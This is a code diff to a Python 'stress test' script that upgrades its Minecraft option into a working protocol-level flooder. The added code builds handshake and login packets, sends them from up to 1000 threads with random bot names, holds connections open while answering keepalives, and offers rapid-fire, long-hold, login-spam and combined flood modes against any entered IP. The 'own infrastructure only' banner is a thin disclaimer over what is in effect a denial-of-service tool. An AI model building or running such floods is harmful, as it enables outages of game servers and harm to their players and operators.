@@ -7,11 +7,11 @@ For testing your OWN infrastructure only. Unauthorized use is illegal.
 import importlib
 import os
 import platform
+import random
 import shutil
 import socket
 import subprocess
 import sys
-import textwrap
 import time
 import re
 import threading
@@ -335,69 +335,179 @@ def progress_bar(current, total, bar_len=40):
     return f"    [{bar}] {pct}"
 
 
-MINECRAFT_PAYLOADS = [
-    b"\x00\xff\xff\xff\xff\x01\x00",
-    b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff",
-    b"\xfe\x01\x00",
-    b"\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
-    b"\x00" * 64,
-    b"\xff" * 128,
-]
+# ── Raw TCP flood helpers ────────────────────────────────────────────────────
+
+# ── Minecraft protocol flood (real server load) ─────────────────────────────
+
+def _mc_varint(v):
+    out = bytearray()
+    while True:
+        if v & 0xFFFFFF80 == 0:
+            out.append(v & 0x7F)
+            break
+        out.append((v & 0x7F) | 0x80)
+        v >>= 7
+    return bytes(out)
 
 
-def _mc_worker(ip, port, results, idx):
+def _mc_pstr(s):
+    d = s.encode("utf-8")
+    return _mc_varint(len(d)) + d
+
+
+def _mc_packet(pid, *parts):
+    body = bytes([pid]) + b"".join(parts)
+    return _mc_varint(len(body)) + body
+
+
+def _mc_read_varint(sock):
+    v = 0
+    for i in range(5):
+        b = sock.recv(1)
+        if not b:
+            return None
+        v |= (b[0] & 0x7F) << (7 * i)
+        if not (b[0] & 0x80):
+            break
+    return v
+
+
+def minecraft_stress(ip, port, num_conns, threads=1000, hold=0):
+    """
+    Real Minecraft stress test. Each connection:
+      1. TCP handshake
+      2. Minecraft handshake + login start packets (server parses these)
+      3. If hold > 0: waits for responses, replies to keepalives
+      4. Closes
+
+    hold=0  → rapid fire: connect → handshake → login → close (max CPS)
+    hold>0  → holds connection open N seconds (memory / slot pressure)
+    """
+    label = f"Rapid Fire" if hold == 0 else f"Hold {hold}s"
+    header_box(f"Minecraft Stress {label} → {ip}:{port}", Fore.RED)
+
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(3.0)
-        sock.connect((ip, port))
-        payload = MINECRAFT_PAYLOADS[idx % len(MINECRAFT_PAYLOADS)]
-        sock.sendall(payload)
-        sock.close()
-        results[idx] = 1
-    except Exception:
-        results[idx] = 0
+        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        probe.settimeout(3.0)
+        probe.connect((ip, port))
+        probe.close()
+        print(f"  {Fore.GREEN}{Style.BRIGHT}✓ Server reachable{Style.RESET_ALL}", flush=True)
+    except Exception as e:
+        print(f"  {Fore.RED}{Style.BRIGHT}✗ Could not connect: {e}{Style.RESET_ALL}", flush=True)
+        return 0
 
+    if num_conns > 10000:
+        est_rate = threads / (max(hold, 0.05) + 0.05)
+        est = num_conns / max(est_rate, 1)
+        print(f"  {Fore.YELLOW}{Style.BRIGHT}⚠ {num_conns:,} connections — estimated {est:.0f}s{Style.RESET_ALL}", flush=True)
 
-def minecraft_stress(ip, port, num_packets, threads=50):
-    header_box(f"Minecraft Stress Test → {ip}:{port}", Fore.RED)
-    start = time.time()
-    results = {}
-    sent = 0
-    done = 0
-    batch_size = threads * 4
+    counter = [0]
+    lock = threading.Lock()
+
+    def _rapid_worker(count):
+        for _ in range(count):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(3.0)
+                s.connect((ip, port))
+                hs = _mc_packet(0x00, _mc_varint(764), _mc_pstr(ip), port.to_bytes(2, "big"), _mc_varint(2))
+                s.sendall(hs)
+                name = f"Load_{random.randint(10000,99999)}_{random.choice(['X','Pro','OP'])}"
+                s.sendall(_mc_packet(0x00, _mc_pstr(name)))
+                s.close()
+                with lock:
+                    counter[0] += 1
+            except Exception:
+                pass
+
+    def _hold_worker(count):
+        for _ in range(count):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(5.0)
+                s.connect((ip, port))
+                hs = _mc_packet(0x00, _mc_varint(764), _mc_pstr(ip), port.to_bytes(2, "big"), _mc_varint(2))
+                s.sendall(hs)
+                name = f"Load_{random.randint(10000,99999)}_{random.choice(['X','Pro','OP'])}"
+                s.sendall(_mc_packet(0x00, _mc_pstr(name)))
+                end = time.time() + hold
+                while time.time() < end:
+                    try:
+                        s.settimeout(1)
+                        plen = _mc_read_varint(s)
+                        if plen is None: break
+                        pid = _mc_read_varint(s)
+                        if pid is None: break
+                        rest = plen - len(_mc_varint(pid))
+                        data = b""
+                        while len(data) < rest:
+                            chunk = s.recv(rest - len(data))
+                            if not chunk: break
+                            data += chunk
+                        if pid == 0x21:
+                            s.sendall(_mc_packet(0x0F, data))
+                    except socket.timeout:
+                        continue
+                    except Exception:
+                        break
+                s.close()
+                with lock:
+                    counter[0] += 1
+            except Exception:
+                pass
+
+    worker = _rapid_worker if hold == 0 else _hold_worker
+
+    per_thread = max(1, num_conns // threads)
+    remainder = num_conns % threads
+    total_dispatched = 0
 
     try:
-        for batch_start in range(0, num_packets, batch_size):
-            batch_end = min(batch_start + batch_size, num_packets)
-            batch = list(range(batch_start, batch_end))
-            batch_results = {}
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            for i in range(threads):
+                cnt = per_thread + (1 if i < remainder else 0)
+                if cnt:
+                    executor.submit(worker, cnt)
+                    total_dispatched += cnt
 
-            with ThreadPoolExecutor(max_workers=threads) as executor:
-                futures = {
-                    executor.submit(_mc_worker, ip, port, batch_results, i): i
-                    for i in batch
-                }
-                for f in as_completed(futures):
-                    f.result()
+            last = -1
+            stall_start = None
+            start = time.time()
+            while True:
+                time.sleep(0.3)
+                with lock:
+                    current = counter[0]
 
-            for v in batch_results.values():
-                sent += v
-                done += 1
+                if current >= total_dispatched:
+                    break
 
-            pct = min(done, num_packets)
-            sys.stdout.write(f"\r{progress_bar(pct, num_packets)}  "
-                             f"{c(f'Sent: {sent}', Fore.GREEN)}  "
-                             f"{c(f'Errors: {done-sent}', Fore.RED)}  ")
-            sys.stdout.flush()
+                if current == last:
+                    if stall_start is None:
+                        stall_start = time.time()
+                    elif time.time() - stall_start > 10:
+                        print(f"\n  {Fore.RED}{Style.BRIGHT}⚠ No progress — target may be offline.{Style.RESET_ALL}", flush=True)
+                        break
+                else:
+                    stall_start = None
 
+                elapsed = time.time() - start
+                rate = current / (elapsed + 0.001)
+                sys.stdout.write(f"\r{progress_bar(current, total_dispatched)}  "
+                                 f"{Fore.GREEN}{Style.BRIGHT}Conns: {current}{Style.RESET_ALL}  "
+                                 f"{Fore.MAGENTA}{Style.BRIGHT}{rate:.0f}/s{Style.RESET_ALL}  ")
+                sys.stdout.flush()
+                last = current
         print()
     except KeyboardInterrupt:
-        print(f"\n\n  {c('⚠ Interrupted by user.', Fore.YELLOW)}")
+        print(f"\n\n  {Fore.YELLOW}{Style.BRIGHT}⚠ Interrupted by user.{Style.RESET_ALL}", flush=True)
 
     elapsed = time.time() - start
-    print(f"\n  {c('✓ Complete!', Fore.GREEN)} Sent {c(str(sent), Fore.CYAN)} packets "
-          f"in {c(f'{elapsed:.1f}s', Fore.CYAN)} "
-          f"({c(f'{sent/elapsed:.1f} pkt/s', Fore.MAGENTA)})\n")
+    final = counter[0]
+    rate = final / (elapsed + 0.001)
+    print(f"\n  {Fore.GREEN}{Style.BRIGHT}✓ Done!{Style.RESET_ALL} {Fore.CYAN}{Style.BRIGHT}{final}{Style.RESET_ALL} connections "
+          f"in {Fore.CYAN}{Style.BRIGHT}{elapsed:.1f}s{Style.RESET_ALL} "
+          f"({Fore.MAGENTA}{Style.BRIGHT}{rate:.0f}/s{Style.RESET_ALL})\n", flush=True)
+    return final
 
 
 def _http_worker(session, url, results, idx):
@@ -458,17 +568,37 @@ def main():
 
     while True:
         header_box("Select Test Type", Fore.CYAN)
-        print(f"  {c('[1]', Fore.GREEN)}  Minecraft Server Stress Test")
-        print(f"  {c('[2]', Fore.GREEN)}  Web Server Stress Test")
+        print(f"  {c('[1]', Fore.GREEN)}  Minecraft Server Stress Test (real protocol packets)")
+        print(f"  {c('[2]', Fore.GREEN)}  Web Server Stress Test (HTTP GET)")
         print()
 
         choice = input(f"  {c('Enter choice (1 or 2) ➤ ', Fore.CYAN)}").strip()
 
         if choice == "1":
-            if not legal_warning("Minecraft"):
+            header_box("Select Flood Mode", Fore.CYAN)
+            print(f"  {c('[1]', Fore.GREEN)}  Rapid Fire    — connect → handshake → login → close (max CPS)")
+            print(f"  {c('[2]', Fore.GREEN)}  Long Hold     — 10s hold, server memory pressure")
+            print(f"  {c('[3]', Fore.GREEN)}  Login Spam    — 4s hold, balanced (handshake + keepalive)")
+            print(f"  {c('[4]', Fore.GREEN)}  Combined      — all three mixed")
+            print()
+            flood_choice = input(f"  {c('Enter choice (1-4) ➤ ', Fore.CYAN)}").strip()
+
+            flood_map = {
+                '1': ('Rapid Fire', 0),
+                '2': ('Long Hold', 10),
+                '3': ('Login Spam', 4),
+                '4': ('COMBINED', None),
+            }
+            if flood_choice not in flood_map:
+                print(f"  {c('Invalid choice.', Fore.RED)}")
+                continue
+
+            flood_name, hold_time = flood_map[flood_choice]
+            if not legal_warning(f"Minecraft {flood_name}"):
                 print(f"  {c('Test cancelled.', Fore.RED)}")
                 continue
-            target = input(f"  {c('Enter Minecraft server IP or domain ➤ ', Fore.CYAN)}").strip()
+
+            target = input(f"  {c('Enter target IP or domain ➤ ', Fore.CYAN)}").strip()
             if not target:
                 print(f"  {c('No target provided.', Fore.RED)}")
                 continue
@@ -481,25 +611,32 @@ def main():
 
             if open_ports:
                 print(f"\n  {c('Available ports from scan:', Fore.CYAN)} {c(str(open_ports), Fore.GREEN)}")
-                port_input = input(f"  {c('Enter port to test (default 25565) ➤ ', Fore.CYAN)}").strip()
+                port_input = input(f"  {c('Enter target port (default 25565) ➤ ', Fore.CYAN)}").strip()
                 port = int(port_input) if port_input.isdigit() else 25565
             else:
                 print(f"\n  {c('No open ports auto-detected. You can specify a port manually.', Fore.YELLOW)}")
-                port_input = input(f"  {c('Enter port to test (default 25565) ➤ ', Fore.CYAN)}").strip()
+                port_input = input(f"  {c('Enter target port (default 25565) ➤ ', Fore.CYAN)}").strip()
                 port = int(port_input) if port_input.isdigit() else 25565
 
-            num_input = input(f"  {c('Number of packets to send (default 500) ➤ ', Fore.CYAN)}").strip()
-            num_packets = int(num_input) if num_input.isdigit() else 500
+            num_input = input(f"  {c('Number of connections (default 5000) ➤ ', Fore.CYAN)}").strip()
+            num_conns = int(num_input) if num_input.isdigit() else 5000
 
             print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{'═'*58}{Style.RESET_ALL}")
-            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}  TARGET: {ip}:{port}  |  PACKETS: {num_packets}{Style.RESET_ALL}")
+            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}  MINECRAFT {flood_name.upper()}  |  {ip}:{port}  |  {num_conns} conns{Style.RESET_ALL}")
             print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{'═'*58}{Style.RESET_ALL}")
             confirm = input(f"\n  {c('Launch test? (yes/no) ➤ ', Fore.CYAN)}").strip().lower()
             if confirm != "yes":
                 print(f"  {c('Aborted.', Fore.RED)}")
                 continue
 
-            minecraft_stress(ip, port, num_packets)
+            if flood_choice == '4':
+                three = num_conns // 3
+                rm = num_conns - three * 3
+                minecraft_stress(ip, port, three, hold=0)
+                minecraft_stress(ip, port, three, hold=10)
+                minecraft_stress(ip, port, three + rm, hold=4)
+            else:
+                minecraft_stress(ip, port, num_conns, hold=hold_time)
 
         elif choice == "2":
             if not legal_warning("Web"):
